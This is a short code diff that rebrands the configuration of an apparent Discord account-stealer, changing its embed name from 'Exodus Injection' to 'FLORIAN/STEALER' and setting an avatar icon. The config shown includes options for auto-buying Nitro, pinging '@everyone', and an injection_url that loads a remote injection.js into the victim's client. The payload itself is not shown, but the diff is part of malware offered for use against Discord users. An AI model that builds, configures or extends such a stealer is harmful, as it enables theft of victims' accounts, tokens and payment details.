@@ -11,8 +11,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Exodus Injection', 
-  embed_icon: ''.replace(/ /g, '%20'),
+  embed_name: 'FLORIAN/STEALER', 
+  embed_icon: 'https://cdn.discordapp.com/avatars/544357143260692481/a_ca57386ae463ae259ef962725ffaccfd?size=512',
   embed_color: 5639644, 
   injection_url: 'https://raw.githubusercontent.com/KingKrex69/Discord-Injection/main/injection.js', 
 
